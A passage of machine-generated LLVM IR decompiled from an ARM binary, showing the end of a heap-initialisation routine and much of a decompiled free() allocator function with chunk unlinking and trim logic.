  br label %dec_label_pc_1354c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_134c4
  %v2_1353c = add i32 %v1_134cc, %v0_1353c
  %v1_13540 = or i32 %v2_1353c, 1
  store i32 %v1_13540, i32* %r3.global-to-local, align 4
  %v1_13544 = load i32, i32* %r1.global-to-local, align 4
  %v2_13544 = add i32 %v1_13544, 4
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  store i32 %v1_13540, i32* %v3_13544, align 4
  %v0_13548 = load i32, i32* %r1.global-to-local, align 4
  %v1_13548 = load i32, i32* @r4, align 4
  %v2_13548 = add i32 %v1_13548, 44
  %v3_13548 = inttoptr i32 %v2_13548 to i32*
  store i32 %v0_13548, i32* %v3_13548, align 4
  br label %dec_label_pc_1354c

dec_label_pc_1354c:                               ; preds = %dec_label_pc_13518, %dec_label_pc_1353c
  %v0_1354c = load i32, i32* %sl.global-to-local, align 4
  %v2_1354c = icmp eq i32 %v0_1354c, 0
  store i32 %v0_1354c, i32* %r1.global-to-local, align 4
  br i1 %v2_1354c, label %dec_label_pc_13558.loopexit, label %dec_label_pc_13474

dec_label_pc_13558.loopexit:                      ; preds = %dec_label_pc_1354c
  %v0_13558.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13558.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_13558.loopexit, %dec_label_pc_13464
  %v1_13558 = phi i32 [ %v1_13558.pre, %dec_label_pc_13558.loopexit ], [ %v1_1355810, %dec_label_pc_13464 ]
  %v0_13560 = phi i32 [ %v0_13558.pre, %dec_label_pc_13558.loopexit ], [ %v1_13470, %dec_label_pc_13464 ]
  %v9_13558 = icmp eq i32 %v0_13560, %v1_13558
  br i1 %v9_13558, label %dec_label_pc_135d0, label %dec_label_pc_13560

dec_label_pc_13560:                               ; preds = %dec_label_pc_13558
  %v1_13560 = add i32 %v0_13560, 4
  store i32 %v1_13560, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13464

dec_label_pc_13568.dec_label_pc_13568_crit_edge:  ; preds = %dec_label_pc_13568.preheader, %dec_label_pc_13568.dec_label_pc_13568_crit_edge
  %v0_13568.pre = load i32, i32* @r4, align 4
  %v1_13568.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13568 = mul i32 %v1_13568.pre, 8
  %v5_13568 = add i32 %v4_13568, %v0_13568.pre
  %v1_1356c = add i32 %v1_13568.pre, 1
  store i32 %v1_1356c, i32* %r2.global-to-local, align 4
  %v1_13570 = add i32 %v5_13568, 44
  store i32 %v1_13570, i32* %r3.global-to-local, align 4
  %v2_13578 = add i32 %v5_13568, 52
  %v3_13578 = inttoptr i32 %v2_13578 to i32*
  store i32 %v1_13570, i32* %v3_13578, align 4
  %v0_1357c = load i32, i32* %r3.global-to-local, align 4
  %v2_1357c = add i32 %v0_1357c, 12
  %v3_1357c = inttoptr i32 %v2_1357c to i32*
  store i32 %v0_1357c, i32* %v3_1357c, align 4
  %v7_13580 = icmp sgt i32 %v1_1356c, 95
  br i1 %v7_13580, label %dec_label_pc_13584, label %dec_label_pc_13568.dec_label_pc_13568_crit_edge

dec_label_pc_13584:                               ; preds = %dec_label_pc_13568.dec_label_pc_13568_crit_edge
  %v0_13584 = load i32, i32* @r4, align 4
  %v1_13584 = inttoptr i32 %v0_13584 to i32*
  %v2_13584 = load i32, i32* %v1_13584, align 4
  store i32 %v2_13584, i32* %r2.global-to-local, align 4
  %v1_13588 = add i32 %v0_13584, 864
  %v2_13588 = inttoptr i32 %v1_13588 to i32*
  %v3_13588 = load i32, i32* %v2_13588, align 4
  %v1_13590 = urem i32 %v2_13584, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13598 = or i32 %v3_13588, 1
  store i32 %v1_13598, i32* %r1.global-to-local, align 4
  %v1_1359c = or i32 %v1_13590, 72
  store i32 %v1_1359c, i32* %r2.global-to-local, align 4
  %v1_135a0 = add i32 %v0_13584, 52
  store i32 %v1_135a0, i32* %ip.global-to-local, align 4
  %v2_135a4 = add i32 %v0_13584, 840
  %v3_135a4 = inttoptr i32 %v2_135a4 to i32*
  store i32 0, i32* %v3_135a4, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v0_135ac = load i32, i32* %r0.global-to-local, align 4
  %v1_135ac = load i32, i32* @r4, align 4
  %v2_135ac = add i32 %v1_135ac, 836
  %v3_135ac = inttoptr i32 %v2_135ac to i32*
  store i32 %v0_135ac, i32* %v3_135ac, align 4
  %v0_135b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_135b0 = load i32, i32* @r4, align 4
  %v2_135b0 = add i32 %v1_135b0, 844
  %v3_135b0 = inttoptr i32 %v2_135b0 to i32*
  store i32 %v0_135b0, i32* %v3_135b0, align 4
  %v1_135b4 = load i32, i32* @r4, align 4
  %v2_135b4 = add i32 %v1_135b4, 852
  %v3_135b4 = inttoptr i32 %v2_135b4 to i32*
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %v3_135b4, align 4
  %v1_135b8 = load i32, i32* @r4, align 4
  %v2_135b8 = add i32 %v1_135b8, 864
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  store i32 %v1_13598, i32* %v3_135b8, align 4
  %v1_135bc = load i32, i32* @r4, align 4
  %v2_135bc = inttoptr i32 %v1_135bc to i32*
  store i32 %v1_1359c, i32* %v2_135bc, align 4
  %v0_135c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_135c0 = load i32, i32* @r4, align 4
  %v2_135c0 = add i32 %v1_135c0, 44
  %v3_135c0 = inttoptr i32 %v2_135c0 to i32*
  store i32 %v0_135c0, i32* %v3_135c0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_135c8 = call i32 @sysconf(i32 30, i32 %v1_13598, i32 %v1_1359c, i32 ptrtoint (i32* @global_var_10000.57 to i32))
  store i32 %v4_135c8, i32* @r0, align 4
  %v1_135cc = load i32, i32* @r4, align 4
  %v2_135cc = add i32 %v1_135cc, 860
  %v3_135cc = inttoptr i32 %v2_135cc to i32*
  store i32 %v4_135c8, i32* %v3_135cc, align 4
  br label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_13558, %dec_label_pc_13584
  %v2_135d4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_135d4, i32* @r4, align 4
  %v1_135d8 = load i32, i32* @r0, align 4
  ret i32 %v1_135d8

; uselistorder directives
  uselistorder i32 %v0_13584, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1357c, { 1, 0 }
  uselistorder i32 %v1_13560, { 1, 0 }
  uselistorder i32 %v0_1354c, { 0, 2, 1 }
  uselistorder i32 %v0_13528, { 1, 0 }
  uselistorder i32 %v1_13478, { 1, 0, 2 }
  uselistorder i32 %v0_13490, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13450, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 17, 6, 14, 5, 10, 2, 11, 3, 12, 4, 13, 0, 15, 16, 8, 9, 7 }
  uselistorder label %dec_label_pc_135d0, { 1, 0 }
  uselistorder label %dec_label_pc_13568.dec_label_pc_13568_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1354c, { 1, 0 }
  uselistorder label %dec_label_pc_13518, { 1, 0 }
  uselistorder label %dec_label_pc_1350c, { 1, 0 }
  uselistorder label %dec_label_pc_13508, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_134c4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_135dc = load i32, i32* @r4, align 4
  %v6_135dc = load i32, i32* @r5, align 4
  %v9_135dc = load i32, i32* @r6, align 4
  %v12_135dc = load i32, i32* @r7, align 4
  %v18_135dc = load i32, i32* @lr, align 4
  %v0_135e4 = load i32, i32* @r0, align 4
  store i32 %v0_135e4, i32* @r6, align 4
  %v2_135e4 = icmp eq i32 %v0_135e4, 0
  %v2_135e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r7, align 4
  br i1 %v2_135e4, label %dec_label_pc_137f0, label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_135f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 108) to i32*), align 4
  store i32 %v4_135f8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_135f8, i32* %r2.global-to-local, align 4
  %v4_13604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), align 4
  store i32 %v4_13604, i32* %r1.global-to-local, align 4
  store i32 %v2_135e8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13610 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  store i32 %v4_13610, i32* %ip.global-to-local, align 4
  store i32 79388, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13610)
  %v0_1361c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1361c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13624 = load i32, i32* @r7, align 4
  %v2_13624 = add i32 %v0_13624, 16
  %v3_13624 = inttoptr i32 %v2_13624 to i32*
  %v4_13624 = load i32, i32* %v3_13624, align 4
  store i32 %v4_13624, i32* %ip.global-to-local, align 4
  store i32 79408, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13624)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13634 = load i32, i32* @r7, align 4
  %v2_13634 = add i32 %v0_13634, 64
  %v3_13634 = inttoptr i32 %v2_13634 to i32*
  %v4_13634 = load i32, i32* %v3_13634, align 4
  store i32 %v4_13634, i32* @lr, align 4
  %v0_13638 = load i32, i32* @r6, align 4
  %v1_13638 = add i32 %v0_13638, -4
  %v2_13638 = inttoptr i32 %v1_13638 to i32*
  %v3_13638 = load i32, i32* %v2_13638, align 4
  store i32 %v3_13638, i32* %r2.global-to-local, align 4
  %v1_1363c = inttoptr i32 %v4_13634 to i32*
  %v2_1363c = load i32, i32* %v1_1363c, align 4
  store i32 %v2_1363c, i32* %r3.global-to-local, align 4
  %v1_13640 = and i32 %v3_13638, -4
  store i32 %v1_13640, i32* %ip.global-to-local, align 4
  %v1_13644 = add i32 %v0_13638, -8
  store i32 %v1_13644, i32* @r5, align 4
  store i32 %v1_13644, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13640, %v2_1363c
  br i1 %tmp, label %dec_label_pc_13674, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_135f4
  %v1_13654 = or i32 %v2_1363c, 3
  store i32 %v1_13654, i32* %r3.global-to-local, align 4
  store i32 %v1_13654, i32* %v1_1363c, align 4
  %v3_13658 = load i32, i32* @lr, align 4
  %v4_13658 = add i32 %v3_13658, -8
  store i32 %v4_13658, i32* %lr.global-to-local, align 4
  %v0_1365c = load i32, i32* %ip.global-to-local, align 4
  %v3_1365c = udiv i32 %v0_1365c, 8
  store i32 %v3_1365c, i32* %r1.global-to-local, align 4
  %v1_13660 = add i32 %v3_13658, -4
  store i32 %v1_13660, i32* %r2.global-to-local, align 4
  %v4_13664 = mul nuw i32 %v3_1365c, 4
  %v5_13664 = add i32 %v4_13664, %v1_13660
  %v6_13664 = inttoptr i32 %v5_13664 to i32*
  %v7_13664 = load i32, i32* %v6_13664, align 4
  store i32 %v7_13664, i32* %r3.global-to-local, align 4
  %v1_13668 = load i32, i32* @r5, align 4
  %v2_13668 = add i32 %v1_13668, 8
  %v3_13668 = inttoptr i32 %v2_13668 to i32*
  store i32 %v7_13664, i32* %v3_13668, align 4
  %v0_1366c = load i32, i32* @r5, align 4
  %v1_1366c = load i32, i32* %r2.global-to-local, align 4
  %v2_1366c = load i32, i32* %r1.global-to-local, align 4
  %v5_1366c = mul i32 %v2_1366c, 4
  %v6_1366c = add i32 %v5_1366c, %v1_1366c
  %v7_1366c = inttoptr i32 %v6_1366c to i32*
  store i32 %v0_1366c, i32* %v7_1366c, align 4
  br label %dec_label_pc_137d8

dec_label_pc_13674:                               ; preds = %dec_label_pc_135f4
  %v1_13674 = and i32 %v3_13638, 2
  %v2_13674 = icmp eq i32 %v1_13674, 0
  br i1 %v2_13674, label %dec_label_pc_1367c, label %dec_label_pc_137b0

dec_label_pc_1367c:                               ; preds = %dec_label_pc_13674
  %v1_1367c = or i32 %v2_1363c, 1
  store i32 %v1_1367c, i32* %r3.global-to-local, align 4
  store i32 %v1_1367c, i32* %v1_1363c, align 4
  %v0_13684 = load i32, i32* @r6, align 4
  %v1_13684 = add i32 %v0_13684, -4
  %v2_13684 = inttoptr i32 %v1_13684 to i32*
  %v3_13684 = load i32, i32* %v2_13684, align 4
  store i32 %v3_13684, i32* %r3.global-to-local, align 4
  %v0_13688 = load i32, i32* @r5, align 4
  %v1_13688 = load i32, i32* %ip.global-to-local, align 4
  %v2_13688 = add i32 %v1_13688, %v0_13688
  store i32 %v2_13688, i32* %lr.global-to-local, align 4
  %v1_1368c = urem i32 %v3_13684, 2
  %v2_1368c = icmp eq i32 %v1_1368c, 0
  %v1_13690 = add i32 %v2_13688, 4
  %v2_13690 = inttoptr i32 %v1_13690 to i32*
  %v3_13690 = load i32, i32* %v2_13690, align 4
  store i32 %v3_13690, i32* %r8.global-to-local, align 4
  br i1 %v2_1368c, label %dec_label_pc_13698, label %dec_label_pc_136cc

dec_label_pc_13698:                               ; preds = %dec_label_pc_1367c
  %v1_13698 = add i32 %v0_13684, -8
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r1.global-to-local, align 4
  %v2_1369c = sub i32 %v0_13688, %v3_13698
  store i32 %v2_1369c, i32* %r3.global-to-local, align 4
  %v1_136a0 = add i32 %v2_1369c, 8
  %v2_136a0 = inttoptr i32 %v1_136a0 to i32*
  %v3_136a0 = load i32, i32* %v2_136a0, align 4
  store i32 %v3_136a0, i32* %r2.global-to-local, align 4
  %v1_136a4 = add i32 %v3_136a0, 12
  %v2_136a4 = inttoptr i32 %v1_136a4 to i32*
  %v3_136a4 = load i32, i32* %v2_136a4, align 4
  store i32 %v3_136a4, i32* %r4.global-to-local, align 4
  %v9_136a8 = icmp eq i32 %v3_136a4, %v2_1369c
  %v1_136ac = add i32 %v2_1369c, 12
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* %r0.global-to-local, align 4
  br i1 %v9_136a8, label %dec_label_pc_136b4, label %dec_label_pc_13718

dec_label_pc_136b4:                               ; preds = %dec_label_pc_13698
  %v1_136b4 = add i32 %v3_136ac, 8
  %v2_136b4 = inttoptr i32 %v1_136b4 to i32*
  %v3_136b4 = load i32, i32* %v2_136b4, align 4
  store i32 %v3_136b4, i32* %r3.global-to-local, align 4
  %v9_136b8 = icmp eq i32 %v3_136b4, %v2_1369c
  br i1 %v9_136b8, label %dec_label_pc_136c0, label %dec_label_pc_13718

dec_label_pc_136c0:                               ; preds = %dec_label_pc_136b4
  store i32 %v3_136a0, i32* %v2_136b4, align 4
  %v0_136c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_136c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_136c4 = add i32 %v1_136c4, 12
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 %v0_136c4, i32* %v3_136c4, align 4
  %v0_136c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c8 = add i32 %v1_136c8, %v0_136c8
  store i32 %v2_136c8, i32* %ip.global-to-local, align 4
  %v0_136d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_136dc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_1367c, %dec_label_pc_136c0
  %v0_13758 = phi i32 [ %v1_13688, %dec_label_pc_1367c ], [ %v2_136c8, %dec_label_pc_136c0 ]
  %v0_136dc = phi i32 [ %v3_13690, %dec_label_pc_1367c ], [ %v0_136dc.pre, %dec_label_pc_136c0 ]
  %v1_136f0 = phi i32 [ %v2_13688, %dec_label_pc_1367c ], [ %v0_136d8.pre, %dec_label_pc_136c0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_136d0 = load i32, i32* @r7, align 4
  %v2_136d0 = add i32 %v0_136d0, 64
  %v3_136d0 = inttoptr i32 %v2_136d0 to i32*
  %v4_136d0 = load i32, i32* %v3_136d0, align 4
  store i32 %v4_136d0, i32* %r2.global-to-local, align 4
  %v1_136d4 = add i32 %v4_136d0, 44
  %v2_136d4 = inttoptr i32 %v1_136d4 to i32*
  %v3_136d4 = load i32, i32* %v2_136d4, align 4
  store i32 %v3_136d4, i32* %r3.global-to-local, align 4
  %v9_136d8 = icmp eq i32 %v1_136f0, %v3_136d4
  %v1_136dc = and i32 %v0_136dc, -4
  store i32 %v1_136dc, i32* %r0.global-to-local, align 4
  br i1 %v9_136d8, label %dec_label_pc_13758, label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %dec_label_pc_136cc
  %v2_136e4 = add i32 %v1_136f0, %v1_136dc
  store i32 %v2_136e4, i32* %r3.global-to-local, align 4
  %v1_136e8 = add i32 %v2_136e4, 4
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r3.global-to-local, align 4
  %v1_136ec = urem i32 %v3_136e8, 2
  %v2_136ec = icmp eq i32 %v1_136ec, 0
  %v2_136f0 = add i32 %v1_136f0, 4
  %v3_136f0 = inttoptr i32 %v2_136f0 to i32*
  store i32 %v1_136dc, i32* %v3_136f0, align 4
  br i1 %v2_136ec, label %dec_label_pc_136f8, label %dec_label_pc_136e4.dec_label_pc_13728_crit_edge

dec_label_pc_136e4.dec_label_pc_13728_crit_edge:  ; preds = %dec_label_pc_136e4
  %v0_13738.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13728

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136e4
  %v0_136f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_136f8 = add i32 %v0_136f8, 8
  %v2_136f8 = inttoptr i32 %v1_136f8 to i32*
  %v3_136f8 = load i32, i32* %v2_136f8, align 4
  store i32 %v3_136f8, i32* %r1.global-to-local, align 4
  %v1_136fc = add i32 %v3_136f8, 12
  %v2_136fc = inttoptr i32 %v1_136fc to i32*
  %v3_136fc = load i32, i32* %v2_136fc, align 4
  store i32 %v3_136fc, i32* %r3.global-to-local, align 4
  %v9_13700 = icmp eq i32 %v3_136fc, %v0_136f8
  %v1_13704 = add i32 %v0_136f8, 12
  %v2_13704 = inttoptr i32 %v1_13704 to i32*
  %v3_13704 = load i32, i32* %v2_13704, align 4
  store i32 %v3_13704, i32* %r2.global-to-local, align 4
  br i1 %v9_13700, label %dec_label_pc_1370c, label %dec_label_pc_13718

dec_label_pc_1370c:                               ; preds = %dec_label_pc_136f8
  %v1_1370c = add i32 %v3_13704, 8
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  store i32 %v3_1370c, i32* %r3.global-to-local, align 4
  %v9_13710 = icmp eq i32 %v3_1370c, %v0_136f8
  br i1 %v9_13710, label %dec_label_pc_1371c, label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_136f8, %dec_label_pc_136b4, %dec_label_pc_13698, %dec_label_pc_1370c
  %v0_13718 = call i32 @abort()
  store i32 %v0_13718, i32* %r0.global-to-local, align 4
  %v0_1371c.pre = load i32, i32* @r1, align 4
  %v1_1371c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1371c

dec_label_pc_1371c:                               ; preds = %dec_label_pc_1370c, %dec_label_pc_13718
  %v1_1371c = phi i32 [ %v3_13704, %dec_label_pc_1370c ], [ %v1_1371c.pre, %dec_label_pc_13718 ]
  %v0_1371c = phi i32 [ %v3_136f8, %dec_label_pc_1370c ], [ %v0_1371c.pre, %dec_label_pc_13718 ]
  %v2_1371c = add i32 %v1_1371c, 8
  %v3_1371c = inttoptr i32 %v2_1371c to i32*
  store i32 %v0_1371c, i32* %v3_1371c, align 4
  %v0_13720 = load i32, i32* %r2.global-to-local, align 4
  %v1_13720 = load i32, i32* %r1.global-to-local, align 4
  %v2_13720 = add i32 %v1_13720, 12
  %v3_13720 = inttoptr i32 %v2_13720 to i32*
  store i32 %v0_13720, i32* %v3_13720, align 4
  %v0_13724 = load i32, i32* %ip.global-to-local, align 4
  %v1_13724 = load i32, i32* %r0.global-to-local, align 4
  %v2_13724 = add i32 %v1_13724, %v0_13724
  store i32 %v2_13724, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_136e4.dec_label_pc_13728_crit_edge, %dec_label_pc_1371c
  %v0_13738 = phi i32 [ %v0_13738.pre, %dec_label_pc_136e4.dec_label_pc_13728_crit_edge ], [ %v2_13724, %dec_label_pc_1371c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1372c = load i32, i32* @r7, align 4
  %v2_1372c = add i32 %v0_1372c, 64
  %v3_1372c = inttoptr i32 %v2_1372c to i32*
  %v4_1372c = load i32, i32* %v3_1372c, align 4
  %v1_13730 = add i32 %v4_1372c, 52
  store i32 %v1_13730, i32* %r3.global-to-local, align 4
  %v1_13734 = add i32 %v4_1372c, 60
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  %v3_13734 = load i32, i32* %v2_13734, align 4
  store i32 %v3_13734, i32* %r1.global-to-local, align 4
  %v1_13738 = or i32 %v0_13738, 1
  store i32 %v1_13738, i32* %r2.global-to-local, align 4
  %v1_1373c = load i32, i32* %r4.global-to-local, align 4
  %v2_1373c = add i32 %v1_1373c, 12
  %v3_1373c = inttoptr i32 %v2_1373c to i32*
  store i32 %v1_13730, i32* %v3_1373c, align 4
  %v0_13740 = load i32, i32* %r1.global-to-local, align 4
  %v1_13740 = load i32, i32* %r4.global-to-local, align 4
  %v2_13740 = add i32 %v1_13740, 8
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v0_13740, i32* %v3_13740, align 4
  %v0_13744 = load i32, i32* %r2.global-to-local, align 4
  %v1_13744 = load i32, i32* %r4.global-to-local, align 4
  %v2_13744 = add i32 %v1_13744, 4
  %v3_13744 = inttoptr i32 %v2_13744 to i32*
  store i32 %v0_13744, i32* %v3_13744, align 4
  %v0_13748 = load i32, i32* %ip.global-to-local, align 4
  %v1_13748 = load i32, i32* %r4.global-to-local, align 4
  %v3_13748 = add i32 %v1_13748, %v0_13748
  %v4_13748 = inttoptr i32 %v3_13748 to i32*
  store i32 %v0_13748, i32* %v4_13748, align 4
  %v0_1374c = load i32, i32* %r4.global-to-local, align 4
  %v1_1374c = load i32, i32* %r1.global-to-local, align 4
  %v2_1374c = add i32 %v1_1374c, 12
  %v3_1374c = inttoptr i32 %v2_1374c to i32*
  store i32 %v0_1374c, i32* %v3_1374c, align 4
  %v0_13750 = load i32, i32* %r4.global-to-local, align 4
  %v1_13750 = load i32, i32* %r3.global-to-local, align 4
  %v2_13750 = add i32 %v1_13750, 8
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  store i32 %v0_13750, i32* %v3_13750, align 4
  br label %dec_label_pc_13768

dec_label_pc_13758:                               ; preds = %dec_label_pc_136cc
  %v2_13758 = add i32 %v1_136dc, %v0_13758
  store i32 %v2_13758, i32* %ip.global-to-local, align 4
  %v1_1375c = or i32 %v2_13758, 1
  store i32 %v1_1375c, i32* %r3.global-to-local, align 4
  %v0_13760 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13760, i32* %v2_136d4, align 4
  %v0_13764 = load i32, i32* %r3.global-to-local, align 4
  %v1_13764 = load i32, i32* %r4.global-to-local, align 4
  %v2_13764 = add i32 %v1_13764, 4
  %v3_13764 = inttoptr i32 %v2_13764 to i32*
  store i32 %v0_13764, i32* %v3_13764, align 4
  br label %dec_label_pc_13768

dec_label_pc_13768:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13758
  %v0_13768 = load i32, i32* %ip.global-to-local, align 4
  %v3_1376c = icmp ult i32 %v0_13768, 131070
  br i1 %v3_1376c, label %dec_label_pc_137d8, label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %dec_label_pc_13768
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13774 = load i32, i32* @r7, align 4
  %v2_13774 = add i32 %v0_13774, 64
  %v3_13774 = inttoptr i32 %v2_13774 to i32*
  %v4_13774 = load i32, i32* %v3_13774, align 4
  store i32 %v4_13774, i32* @r4, align 4
  %v1_13778 = inttoptr i32 %v4_13774 to i32*
  %v2_13778 = load i32, i32* %v1_13778, align 4
  store i32 %v2_13778, i32* %r3.global-to-local, align 4
  %v1_1377c = and i32 %v2_13778, 2
  %v2_1377c = icmp eq i32 %v1_1377c, 0
  br i1 %v2_1377c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13770
  store i32 %v4_13774, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13770, %bb
  %v1_13784 = xor i1 %v2_1377c, true
  call void @__pseudo_cond_branch(i1 %v1_13784, i32 ptrtoint (i32* @global_var_13428.480 to i32))
  %v0_13788 = load i32, i32* @r4, align 4
  %v1_13788 = add i32 %v0_13788, 44
  %v2_13788 = inttoptr i32 %v1_13788 to i32*
  %v3_13788 = load i32, i32* %v2_13788, align 4
  store i32 %v3_13788, i32* %r3.global-to-local, align 4
  %v1_1378c = add i32 %v3_13788, 4
  %v2_1378c = inttoptr i32 %v1_1378c to i32*
  %v3_1378c = load i32, i32* %v2_1378c, align 4
  store i32 %v3_1378c, i32* %r3.global-to-local, align 4
  %v1_13790 = add i32 %v0_13788, 836
  %v2_13790 = inttoptr i32 %v1_13790 to i32*
  %v3_13790 = load i32, i32* %v2_13790, align 4
  store i32 %v3_13790, i32* %r2.global-to-local, align 4
  %v1_13794 = and i32 %v3_1378c, -4
  store i32 %v1_13794, i32* %r3.global-to-local, align 4
  %v3_13798 = icmp ult i32 %v1_13794, %v3_13790
  br i1 %v3_13798, label %dec_label_pc_137d8, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %bb16
  store i32 %v0_13788, i32* %r1.global-to-local, align 4
  %v1_137a4 = add i32 %v0_13788, 840
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %v3_137a4, i32* %r0.global-to-local, align 4
  %v2_137a8 = call i32 @__malloc_trim(i32 %v3_137a4, i32 %v0_13788)
  store i32 %v2_137a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137d8

dec_label_pc_137b0:                               ; preds = %dec_label_pc_13674
  %v2_137b0 = inttoptr i32 %v1_13644 to i32*
  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  store i32 %v3_137b0, i32* %r0.global-to-local, align 4
  %v1_137b4 = add i32 %v4_13634, 848
  %v2_137b4 = inttoptr i32 %v1_137b4 to i32*
  %v3_137b4 = load i32, i32* %v2_137b4, align 4
  store i32 %v3_137b4, i32* %r2.global-to-local, align 4
  %v1_137b8 = add i32 %v4_13634, 868
  %v2_137b8 = inttoptr i32 %v1_137b8 to i32*
  %v3_137b8 = load i32, i32* %v2_137b8, align 4
  %v2_137bc = add i32 %v3_137b0, %v1_13640
  store i32 %v2_137bc, i32* %r1.global-to-local, align 4
  %v1_137c0 = add i32 %v3_137b4, -1
  store i32 %v1_137c0, i32* %r2.global-to-local, align 4
  %v2_137c4 = sub i32 %v3_137b8, %v2_137bc
  store i32 %v2_137c4, i32* %r3.global-to-local, align 4
  store i32 %v2_137c4, i32* %v2_137b8, align 4
  %v1_137cc = load i32, i32* @lr, align 4
  %v2_137cc = add i32 %v1_137cc, 848
  %v3_137cc = inttoptr i32 %v2_137cc to i32*
  store i32 %v1_137c0, i32* %v3_137cc, align 4
  %v0_137d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_137d0 = load i32, i32* @r5, align 4
  %v2_137d0 = sub i32 %v1_137d0, %v0_137d0
  store i32 %v2_137d0, i32* %r0.global-to-local, align 4
